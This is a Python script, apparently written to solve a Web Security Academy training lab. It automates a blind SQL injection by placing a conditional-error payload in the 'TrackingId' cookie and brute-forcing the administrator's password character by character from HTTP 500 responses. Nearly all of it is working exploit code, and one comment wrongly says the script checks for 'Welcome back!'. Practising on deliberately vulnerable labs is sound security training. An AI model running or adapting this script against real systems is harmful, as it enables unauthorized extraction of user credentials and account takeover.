# Import the requests module for sending HTTP requests
import requests

# Import the string module for string manipulations
import string

# Set the target URL for the SQL injection attack
url = "https://0a9400df03c8381f80a430ef0089001e.web-security-academy.net/"

# Initialize two empty strings for storing the malicious payload and the extracted password
cookievalue = ""
password = ""

# Create a dictionary for setting the 'TrackingId' cookie in the HTTP request
cookies = {"TrackingId": cookievalue}

# Create a list of characters for guessing the password. The list includes all lowercase letters and digits
characters = list(string.ascii_lowercase)
characters = characters + list(string.digits)

# Start a loop that will iterate 20 times. Each iteration corresponds to one character in the password
for i in range(1, 21):
    # Start a nested loop that will iterate over each character in the `characters` list
    for char in characters:
        # Create the malicious payload. The payload is a SQL injection that guesses the `i`-th character of the 'administrator' user's password
        # cookievalue = "x'+UNION SELECT+'a' FROM users WHERE username='administrator' AND substring(password,{},1)='{}'--".format(
        #     i, char
        # )
        # For blind sql injection:
        cookievalue = "x' || (SELECT CASE WHEN (SUBSTR(password,{},1) = '{}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '".format(
            i, char
        )
        # Set the 'TrackingId' cookie to the malicious payload
        cookies = {"TrackingId": cookievalue}
        # Send a HTTP GET request to the target URL with the malicious cookie
        r = requests.get(url, cookies=cookies)
        # Get the text of the HTTP response
        response = r.text
        # Check if the HTTP response contains the string "Welcome back!". If it does, the password guess was correct
        if r.status_code == 500:
            # Print the correct password character
            print(char)
            # Add the correct password character to the `password` string
            password = password + char

# Print the final password after all iterations are complete
print("Password is: " + password)
